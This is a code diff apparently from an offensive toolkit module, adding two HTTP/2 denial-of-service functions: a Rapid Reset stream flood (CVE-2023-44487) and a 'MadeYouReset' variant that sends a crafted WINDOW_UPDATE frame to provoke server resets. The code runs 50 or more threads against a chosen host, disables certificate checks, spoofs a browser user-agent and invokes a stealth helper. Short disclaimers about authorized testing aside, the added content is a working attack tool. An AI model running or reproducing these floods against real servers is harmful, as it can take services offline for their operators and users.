@@ -6,6 +6,7 @@ For authorized infrastructure resilience auditing only.
 """
 
 import socket
+import ssl
 import threading
 import time
 import random
@@ -16,6 +17,15 @@ from shadowcypher.core.module import BaseModule
 from shadowcypher.core.runner import runner
 from shadowcypher.core.sanitize import validate_target, validate_port
 from shadowcypher.core.stealth import require_stealth
+
+try:
+    import h2.connection
+    import h2.config
+    import h2.events
+    import h2.exceptions
+    HAS_H2 = True
+except ImportError:
+    HAS_H2 = False
 
 
 # ── Metric store (shared across test threads) ──
@@ -370,6 +380,192 @@ class ApplicationStressTest(BaseModule):
                 on_output(f"[APP_STRESS] TEST_COMPLETE\n")
 
         threading.Thread(target=_slow_post_worker, daemon=True).start()
+        return task_id
+
+    # ── HTTP/2 Rapid Reset (CVE-2023-44487 + 2025 variant) ──
+
+    @staticmethod
+    def http2_rapid_reset(
+        target_host: str,
+        target_port: int = 443,
+        streams_per_conn: int = 100,
+        duration: int = 60,
+        use_tls: bool = True,
+        on_output=None,
+    ) -> str:
+        """
+        HTTP/2 Rapid Reset attack (CVE-2023-44487).
+        Opens HTTP/2 connections, fires streams at machine speed, immediately
+        RST_STREAMs each — server allocates resources for every stream before
+        the cancel. Bypasses MAX_CONCURRENT_STREAMS limits at the resource level.
+        Requires: pip install h2
+        For authorized infrastructure resilience testing only.
+        """
+        require_stealth(on_output=on_output)
+        if not HAS_H2:
+            msg = "[H2_RESET] DEPENDENCY_MISSING: Install h2 library: pip install h2"
+            if on_output: on_output(msg + "\n")
+            return ""
+        if not validate_target(target_host):
+            if on_output: on_output("[H2_RESET] FAULT: Invalid target\n")
+            return ""
+
+        task_id = "H2_RAPID_RESET"
+        _stop_event.clear()
+        _stats.reset()
+        _stats.start_time = time.time()
+        deadline = time.time() + duration
+
+        def _connection_worker():
+            while not _stop_event.is_set() and time.time() < deadline:
+                try:
+                    raw = socket.create_connection((target_host, target_port), timeout=5)
+                    if use_tls:
+                        ctx = ssl.create_default_context()
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        ctx.set_alpn_protocols(["h2"])
+                        raw = ctx.wrap_socket(raw, server_hostname=target_host)
+
+                    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
+                    conn = h2.connection.H2Connection(config=cfg)
+                    conn.initiate_connection()
+                    raw.sendall(conn.data_to_send(65535))
+
+                    for _ in range(streams_per_conn):
+                        if _stop_event.is_set(): break
+                        sid = conn.get_next_available_stream_id()
+                        conn.send_headers(sid, [
+                            (":method", "GET"),
+                            (":path", f"/?{random.randint(0, 999999)}"),
+                            (":scheme", "https" if use_tls else "http"),
+                            (":authority", target_host),
+                            ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
+                        ])
+                        # Immediately RST the stream — server already allocated resources
+                        conn.reset_stream(sid)
+                        data = conn.data_to_send(65535)
+                        if data:
+                            raw.sendall(data)
+                        _stats.record_request(len(data))
+
+                    raw.close()
+                except Exception:
+                    _stats.record_error()
+
+        def _reporter():
+            while not _stop_event.is_set() and time.time() < deadline:
+                snap = _stats.snapshot()
+                if on_output:
+                    on_output(f"[H2_RESET] streams={snap['requests_sent']} "
+                              f"rps={snap['requests_per_second']} "
+                              f"errors={snap['errors']}\n")
+                time.sleep(5)
+            _stop_event.set()
+
+        if on_output:
+            on_output(f"[H2_RESET] INITIATED: {target_host}:{target_port} "
+                      f"{streams_per_conn} streams/conn for {duration}s\n")
+
+        pool = [threading.Thread(target=_connection_worker, daemon=True)
+                for _ in range(50)]
+        for t in pool: t.start()
+        threading.Thread(target=_reporter, daemon=True).start()
+        return task_id
+
+    @staticmethod
+    def http2_made_you_reset(
+        target_host: str,
+        target_port: int = 443,
+        connections: int = 50,
+        duration: int = 60,
+        on_output=None,
+    ) -> str:
+        """
+        MadeYouReset variant (CVE-2025-8671 class).
+        Sends syntactically valid but malformed HTTP/2 frames that force the
+        SERVER to emit RST_STREAM. Because the server closes the stream, it
+        bypasses MAX_CONCURRENT_STREAMS accounting entirely — the server
+        believes the stream is closed while backend resources are still held.
+        Standard client-side RST rate limiting is completely ineffective here.
+        For authorized infrastructure resilience testing only.
+        """
+        require_stealth(on_output=on_output)
+        if not HAS_H2:
+            msg = "[MADE_YOU_RESET] DEPENDENCY_MISSING: pip install h2"
+            if on_output: on_output(msg + "\n")
+            return ""
+        if not validate_target(target_host):
+            if on_output: on_output("[MADE_YOU_RESET] FAULT: Invalid target\n")
+            return ""
+
+        task_id = "H2_MADE_YOU_RESET"
+        _stop_event.clear()
+        _stats.reset()
+        _stats.start_time = time.time()
+        deadline = time.time() + duration
+
+        def _myr_worker():
+            while not _stop_event.is_set() and time.time() < deadline:
+                try:
+                    raw = socket.create_connection((target_host, target_port), timeout=5)
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    ctx.set_alpn_protocols(["h2"])
+                    raw = ctx.wrap_socket(raw, server_hostname=target_host)
+
+                    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
+                    conn = h2.connection.H2Connection(config=cfg)
+                    conn.initiate_connection()
+                    raw.sendall(conn.data_to_send(65535))
+
+                    # Open a stream with valid headers
+                    sid = conn.get_next_available_stream_id()
+                    conn.send_headers(sid, [
+                        (":method", "POST"),
+                        (":path", "/"),
+                        (":scheme", "https"),
+                        (":authority", target_host),
+                        ("content-length", "999999999"),  # Lie about body size
+                        ("content-type", "application/octet-stream"),
+                    ])
+                    raw.sendall(conn.data_to_send(65535))
+
+                    # Send a WINDOW_UPDATE on a non-existent stream — forces PROTOCOL_ERROR
+                    # → server emits RST_STREAM / GOAWAY, closes stream on ITS side
+                    # but we keep the connection alive and immediately open new streams
+                    bad_frame = (
+                        b"\x00\x00\x04"  # length = 4
+                        b"\x08"          # type = WINDOW_UPDATE
+                        b"\x00"          # flags
+                        b"\x00\x00\x00\x01"  # stream ID = 1 (closed stream)
+                        b"\x00\x00\x00\x01"  # increment = 1
+                    )
+                    raw.sendall(bad_frame)
+                    _stats.record_request(len(bad_frame))
+                    time.sleep(0.01)
+                    raw.close()
+                except Exception:
+                    _stats.record_error()
+
+        def _reporter():
+            while not _stop_event.is_set() and time.time() < deadline:
+                snap = _stats.snapshot()
+                if on_output:
+                    on_output(f"[MADE_YOU_RESET] pkts={snap['requests_sent']} "
+                              f"rps={snap['requests_per_second']} "
+                              f"errors={snap['errors']}\n")
+                time.sleep(5)
+            _stop_event.set()
+
+        if on_output:
+            on_output(f"[MADE_YOU_RESET] INITIATED: {target_host}:{target_port} "
+                      f"{connections} workers for {duration}s\n")
+
+        pool = [threading.Thread(target=_myr_worker, daemon=True) for _ in range(connections)]
+        for t in pool: t.start()
+        threading.Thread(target=_reporter, daemon=True).start()
         return task_id
 
     # ── Stats & Control ──
